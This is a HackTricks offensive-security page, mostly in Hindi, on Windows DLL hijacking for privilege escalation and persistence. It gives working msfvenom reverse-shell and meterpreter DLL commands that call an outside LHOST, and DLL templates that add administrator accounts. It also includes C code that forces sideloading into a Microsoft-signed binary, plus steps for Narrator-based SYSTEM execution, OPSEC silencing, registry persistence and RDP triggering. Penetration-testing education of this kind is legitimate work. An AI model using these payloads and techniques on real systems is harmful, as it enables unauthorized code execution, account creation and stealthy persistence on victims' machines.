# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## बुनियादी जानकारी

DLL Hijacking में एक भरोसेमंद एप्लिकेशन को एक malicious DLL लोड करने के लिए manipulate किया जाता है। यह शब्द कई तकनीकों को शामिल करता है जैसे **DLL Spoofing, Injection, and Side-Loading**। इसे मुख्यतः code execution, persistence प्राप्त करने और कम आम तौर पर privilege escalation के लिए उपयोग किया जाता है। यहाँ भले ही escalation पर ध्यान है, पर hijacking की विधि उद्देश्यों के बीच समान रहती है।

### सामान्य तकनीकें

DLL hijacking के लिए कई तरीकों का उपयोग किया जाता है, और इनकी प्रभावशीलता इस बात पर निर्भर करती है कि एप्लिकेशन DLL को कैसे लोड करता है:

1. **DLL Replacement**: एक वास्तविक DLL को malicious वाले से बदलना, आवश्यक होने पर original DLL की functionality बनाए रखने के लिए DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: malicious DLL को उस search path में रख देना जो legitimate वाले से पहले खोजा जाता है, ताकि वह पहले लोड हो जाए।
3. **Phantom DLL Hijacking**: ऐसा malicious DLL बनाना जिसे एप्लिकेशन लोड कर ले क्योंकि वह किसी non-existent required DLL समझ लेता है।
4. **DLL Redirection**: खोज पैरामीटर जैसे %PATH% या .exe.manifest / .exe.local फाइलों को बदलकर एप्लिकेशन को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को malicious संस्करण से बदलना, यह तरीका अक्सर DLL side-loading से जुड़ा होता है।
6. **Relative Path DLL Hijacking**: malicious DLL को user-controlled directory में रखना जहाँ कॉपी किए गए एप्लिकेशन के साथ रखा गया हो, यह Binary Proxy Execution तकनीकों से मिलता-जुलता है।

## Finding missing Dlls

सिस्टम के अंदर missing Dlls खोजने का सबसे सामान्य तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) (sysinternals) चलाना है और निम्नलिखित 2 फ़िल्टर सेट करना:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल "File System Activity" दिखाएँ:

![](<../../../images/image (153).png>)

यदि आप सामान्य तौर पर **missing dlls** खोज रहे हैं तो इसे कुछ सेकंड के लिए चलने दें।\
यदि आप किसी specific executable के भीतर missing dll खोज रहे हैं तो आपको एक और फ़िल्टर सेट करना चाहिए जैसे "Process Name" "contains" `<exec name>`, इसे execute करें, और events capture करना रोक दें।

## Exploiting Missing Dlls

Privilege escalation प्राप्त करने के लिए, हमारी सबसे अच्छी संभावना यह है कि हम ऐसा एक DLL लिख सकें जिसे कोई privileged process लोड करने की कोशिश करेगा उन स्थानों में जहाँ उसे खोजा जाएगा। इसलिए, हम या तो उस फ़ोल्डर में एक DLL लिख पाएँगे जहाँ वह DLL original DLL वाले फ़ोल्डर से पहले खोजा जाता है (अजीब केस), या हम किसी ऐसे फ़ोल्डर में लिख पाएँगे जहाँ DLL खोजा जाएगा और original DLL किसी भी फ़ोल्डर में मौजूद नहीं है।

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows applications DLLs को एक pre-defined search paths के सेट के अनुसार और एक विशेष क्रम में खोजते हैं। DLL hijacking तब पैदा होता है जब एक malicious DLL को रणनीतिक रूप से उन directories में से किसी एक में रखा जाता है ताकि वह authentic DLL से पहले लोड हो जाए। इसे रोकने का एक समाधान यह है कि एप्लिकेशन जिन DLLs का संदर्भ लेता है उनके लिए absolute paths का उपयोग करे।

नीचे आप 32-bit सिस्टम्स पर DLL search order देख सकते हैं:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

यह SafeDllSearchMode enabled के साथ default search order है। जब यह disabled होता है तो current directory दूसरे स्थान पर आ जाता है। इस सुविधा को disable करने के लिए HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode registry value बनाकर इसे 0 पर सेट करें (default enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ बुलाया जाता है तो search उस directory से शुरू होती है जहाँ वह executable module जिसे LoadLibraryEx लोड कर रहा है, स्थित है।

अंत में, ध्यान दें कि कोई DLL केवल नाम देकर नहीं बल्कि absolute path संकेत करके भी लोड किया जा सकता है। उस स्थिति में वह DLL केवल उसी path में ही खोजा जाएगा (यदि उस DLL की कोई dependencies हैं, तो उन्हें भी नाम देकर लोड किए जाने के रूप में खोजा जाएगा)।

Search order को बदलने के और भी तरीके हैं पर यहाँ मैं उन्हें बताने वाला नहीं हूँ।

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

एक newly created process के DLL search path को deterministic रूप से प्रभावित करने का एक advanced तरीका यह है कि ntdll की native APIs के साथ process बनाते समय RTL_USER_PROCESS_PARAMETERS में DllPath फील्ड सेट किया जाए। यहाँ attacker-controlled directory प्रदान करके, एक target process जिसे imported DLL नाम से resolve करता है (absolute path नहीं और safe loading flags का उपयोग नहीं कर रहा) को उस directory से malicious DLL लोड करने के लिए मजबूर किया जा सकता है।

Key idea
- RtlCreateProcessParametersEx के साथ process parameters बनाएं और एक custom DllPath प्रदान करें जो आपके controlled फ़ोल्डर की ओर इशारा करे (उदा., वही directory जहाँ आपका dropper/unpacker रहता है)।
- RtlCreateUserProcess के साथ process बनाएं। जब target binary किसी DLL को नाम से resolve करेगा, loader इस प्रदान किए गए DllPath को resolution के दौरान देखेगा, जिससे reliable sideloading संभव हो जाएगा भले ही malicious DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह केवल बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- टारगेट को नाम से import करना चाहिए या LoadLibrary करना चाहिए (absolute path नहीं और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग नहीं हो रहा हो).
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

ऑपरेशनल उपयोग का उदाहरण
- अपने DllPath डायरेक्टरी में एक malicious xmllite.dll रखें (जो आवश्यक functions export करे या real one का proxy करे)।
- ऊपर बताए गए तरीके का उपयोग करते हुए उस signed binary को लॉन्च करें जो नाम से xmllite.dll को खोजता है। लोडर प्रदान किए गए DllPath के माध्यम से import को resolve करता है और आपका DLL साइडलोड कर देता है।

यह तकनीक in-the-wild में multi-stage sideloading chains चलाने के लिए देखी गई है: एक initial launcher एक helper DLL गिराता है, जो फिर एक Microsoft-signed, hijackable binary को spawn करता है जिसमें custom DllPath होता है ताकि staging directory से attacker’s DLL को लोड करने के लिए मजबूर किया जा सके।


#### Exceptions on dll search order from Windows docs

Windows documentation में DLL search order पर कुछ अपवाद बताए गए हैं:

- जब कोई **DLL that shares its name with one already loaded in memory** मिलता है, तो सिस्टम सामान्य खोज को बायपास कर देता है। इसके बजाय, यह रे‍डायरेक्शन और एक manifest की जाँच करता है उसके बाद ही पहले से memory में मौजूद DLL पर डिफ़ॉल्ट करता है। **इस परिदृश्य में, सिस्टम DLL की खोज नहीं करता है**।
- उन मामलों में जहाँ DLL को current Windows version के लिए एक **known DLL** के रूप में पहचाना जाता है, सिस्टम अपने version के known DLL और उसके किसी भी dependent DLLs का उपयोग करेगा, **और खोज प्रक्रिया को छोड़ देगा**। रजिस्ट्री कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL के पास dependencies हैं**, तो इन dependent DLLs की खोज ऐसे की जाती है मानो उन्हें केवल उनके **module names** द्वारा संकेतित किया गया हो, भले ही प्रारंभिक DLL को पूर्ण path के माध्यम से पहचाना गया हो।

### विशेषाधिकार बढ़ाना

**आवश्यकताएँ**:

- ऐसी प्रक्रिया पहचानें जो **different privileges** के तहत चलती है या चलेगी (horizontal or lateral movement), और जिसमें **lacking a DLL** की स्थिति हो।
- सुनिश्चित करें कि उस किसी भी **directory** में **write access** उपलब्ध हो जहाँ पर **DLL** की **searched for** जाएगी। यह स्थान executable की directory हो सकती है या system path के भीतर कोई directory हो सकती है।

हाँ, आवश्यकताएँ ढूँढना जटिल है क्योंकि **by default it's kind of weird to find a privileged executable missing a dll** और यह और भी अजीब है कि system path फ़ोल्डर पर write permissions हों (आपके पास by default नहीं होते)। लेकिन, misconfigured environments में यह संभव है।\
अगर आप भाग्यशाली हैं और आवश्यकताएँ पूरी कर लेते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट देख सकते हैं। भले ही प्रोजेक्ट का **main goal of the project is bypass UAC** हो, वहाँ आपको उस Windows version के लिए Dll hijacking का एक **PoC** मिल सकता है जिसका आप उपयोग कर सकें (शायद सिर्फ उस फ़ोल्डर के path को बदलकर जहाँ आपके पास write permissions हैं)।

ध्यान दें कि आप **check your permissions in a folder** इस तरह कर सकते हैं:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियाँ जांचें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable की imports और किसी dll की exports भी निम्न के साथ चेक कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### स्वचालित टूल

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) system PATH के किसी भी फ़ोल्डर में आपके लिखने की permissions हैं या नहीं जाँच करेगा.\
इस vulnerability को खोजने के लिए अन्य उपयोगी automated tools **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप किसी exploitable scenario को पाते हैं तो इसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण बातों में से एक है कि आप **ऐसा dll बनाएँ जो कम से कम उन सभी फ़ंक्शंस को export करे जिन्हें executable इससे import करेगा**। फिर भी, ध्यान दें कि Dll Hijacking [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) या from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** आप execution के लिए dll hijacking पर केंद्रित इस dll hijacking स्टडी में **how to create a valid dll** का एक उदाहरण पा सकते हैं: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
इसके अतिरिक्त, **अगले अनुभाग** में आपको कुछ **बुनियादी dll कोड** मिलेंगे जो **टेम्पलेट्स** के रूप में उपयोगी हो सकते हैं या ऐसी **dll बनाने** में मदद कर सकते हैं जिनमें गैर-आवश्यक फ़ंक्शंस exported हों।

## **Dlls बनाना और कंपाइल करना**

### **Dll Proxifying**

बुनियादी तौर पर एक **Dll proxy** वह Dll होता है जो लोड होने पर आपका malicious code execute कर सके और साथ ही अपेक्षित व्यवहार दिखाने के लिए वास्तविक लाइब्रेरी को कॉल्स relay करके सभी कॉल्स को forward कर दे।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) टूल के साथ आप असल में किसी executable को निर्दिष्ट करके और उस library का चयन करके जिसे आप proxify करना चाहते हैं, एक proxified dll generate कर सकते हैं या केवल Dll निर्दिष्ट करके proxified dll generate कर सकते हैं।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 — मैंने x64 संस्करण नहीं देखा):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका अपना

ध्यान दें कि कई मामलों में वह Dll जिसे आप कंपाइल करते हैं, उसे **export several functions** करना होगा जिन्हें victim process द्वारा लोड किया जाएगा; यदि ये functions मौजूद नहीं होंगे तो **binary won't be able to load** them और **exploit will fail**।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL उदाहरण उपयोगकर्ता निर्माण के साथ</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>वैकल्पिक C DLL थ्रेड एंट्री के साथ</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## केस स्टडी: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe स्टार्ट पर अभी भी एक अनुमाननीय, भाषा-विशिष्ट localization DLL को लोड करने की कोशिश करता है जिसे arbitrary code execution और persistence के लिए hijack किया जा सकता है।

मुख्य तथ्य
- प्रोब पथ (वर्तमान बिल्ड्स): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- पुराना पथ (पुराने बिल्ड्स): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- यदि OneCore पथ पर एक writable attacker-controlled DLL मौजूद है, तो वह लोड हो जाती है और `DllMain(DLL_PROCESS_ATTACH)` चलता है। किसी भी exports की आवश्यकता नहीं है।

Procmon के साथ खोज
- फ़िल्टर: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Narrator शुरू करें और ऊपर दिए गए पथ को लोड करने के प्रयास को देखें।

न्यूनतम DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC मौन
- एक साधारण hijack UI पर बोलेगा/हाइलाइट करेगा। चुप रहने के लिए, attach करते समय Narrator थ्रेड्स को enumerate करें, मुख्य थ्रेड को खोलें (`OpenThread(THREAD_SUSPEND_RESUME)`) और `SuspendThread` करें; अपनी खुद की थ्रेड में जारी रखें। पूर्ण कोड के लिए PoC देखें।

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- ऊपर दिए गए के साथ, Narrator शुरू करने पर प्लांट की गई DLL लोड हो जाएगी। secure desktop (logon screen) पर Narrator शुरू करने के लिए CTRL+WIN+ENTER दबाएँ।

RDP-triggered SYSTEM execution (lateral movement)
- क्लासिक RDP security layer सक्षम करें: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- होस्ट पर RDP करें, logon screen पर CTRL+WIN+ENTER दबाकर Narrator लॉन्च करें; आपकी DLL secure desktop पर SYSTEM के रूप में execute होगी।
- जब RDP session बंद होगा तब execution रुक जाएगी—तुरंत inject/migrate करें।

Bring Your Own Accessibility (BYOA)
- आप एक built-in Accessibility Tool (AT) registry entry (उदा., CursorIndicator) क्लोन कर सकते हैं, इसे किसी मनमाना binary/DLL की ओर इशारा करने के लिए edit करें, import करें, फिर `configuration` को उस AT नाम पर सेट करें। यह Accessibility framework के तहत मनमाना execution proxy करता है।

Notes
- `%windir%\System32` के अंतर्गत लिखना और HKLM मान बदलना admin अधिकारों की आवश्यकता रखता है।
- सारा payload लॉजिक `DLL_PROCESS_ATTACH` में हो सकता है; किसी export की आवश्यकता नहीं है।

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### भेद्यता विवरण

- **घटक**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### एक्सप्लॉयट कार्यान्वयन

एक attacker उसी डायरेक्टरी में एक malicious `hostfxr.dll` stub रख सकता है, गायब DLL का फायदा उठाकर उपयोगकर्ता के संदर्भ में कोड निष्पादन प्राप्त करने के लिए:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### हमले का प्रवाह

1. एक सामान्य उपयोगकर्ता के रूप में, `hostfxr.dll` को `C:\ProgramData\Lenovo\TPQM\Assistant\` में रखें।
2. वर्तमान उपयोगकर्ता के संदर्भ में शेड्यूल किए गए कार्य के 9:30 AM पर चलने की प्रतीक्षा करें।
3. यदि जब कार्य निष्पादित होता है तब कोई एडमिनिस्ट्रेटर लॉग इन हो, तो दुर्भावनापूर्ण DLL एडमिनिस्ट्रेटर के सत्र में medium integrity पर चलती है।
4. medium integrity से SYSTEM privileges तक पहुँचने के लिए standard UAC bypass techniques का उपयोग करें।

## केस स्टडी: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

हमलावर अक्सर MSI-based droppers को DLL side-loading के साथ जोड़ते हैं ताकि वे payloads को एक trusted, signed process के तहत निष्पादित कर सकें।

श्रृंखला का अवलोकन
- उपयोगकर्ता MSI डाउनलोड करता है। GUI install के दौरान एक CustomAction चुपचाप चलता है (उदा., LaunchApplication या VBScript action), जो embedded resources से अगले चरण का पुनर्निर्माण करता है।
- Dropper एक वैध, signed EXE और एक दुर्भावनापूर्ण DLL को उसी directory में लिखता है (उदाहरण जोड़ी: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll)।
- जब signed EXE शुरू किया जाता है, Windows DLL search order पहले working directory से wsc.dll लोड करती है, जिससे attacker code एक signed parent के तहत निष्पादित होता है (ATT&CK T1574.001)।

MSI विश्लेषण (किस पर ध्यान दें)
- CustomAction table:
- ऐसे entries देखें जो executables या VBScript चलाते हों। संदिग्ध पैटर्न का उदाहरण: LaunchApplication जो बैकग्राउंड में एक embedded file को execute करता है।
- Orca (Microsoft Orca.exe) में CustomAction, InstallExecuteSequence और Binary tables का निरीक्षण करें।
- MSI CAB में embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- कई छोटे fragments देखें जो VBScript CustomAction द्वारा जोड़ दिए जाते हैं और decrypt किए जाते हैं। सामान्य प्रवाह:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
व्यावहारिक sideloading wsc_proxy.exe के साथ
- इन दो फ़ाइलों को एक ही फ़ोल्डर में रखें:
- wsc_proxy.exe: वैध साइन किया गया host (Avast)। प्रक्रिया अपने फ़ोल्डर से नाम द्वारा wsc.dll लोड करने का प्रयास करती है।
- wsc.dll: attacker DLL। यदि किसी specific exports की आवश्यकता नहीं है तो DllMain पर्याप्त हो सकता है; अन्यथा, एक proxy DLL बनाकर आवश्यक exports को genuine library की ओर अग्रेषित करें, जबकि payload DllMain में चल रहा हो।
- एक न्यूनतम DLL payload बनाएं:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export आवश्यकताओं के लिए, एक proxying framework (e.g., DLLirant/Spartacus) का उपयोग करें ताकि एक forwarding DLL जनरेट हो जो आपका payload भी execute करे।

- यह technique host binary द्वारा DLL name resolution पर निर्भर करती है। यदि host absolute paths या safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) का उपयोग करता है, तो hijack असफल हो सकता है।
- KnownDLLs, SxS, और forwarded exports precedence को प्रभावित कर सकते हैं और host binary और export set के चयन के दौरान इन्हें ध्यान में रखना चाहिए।

## संदर्भ

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
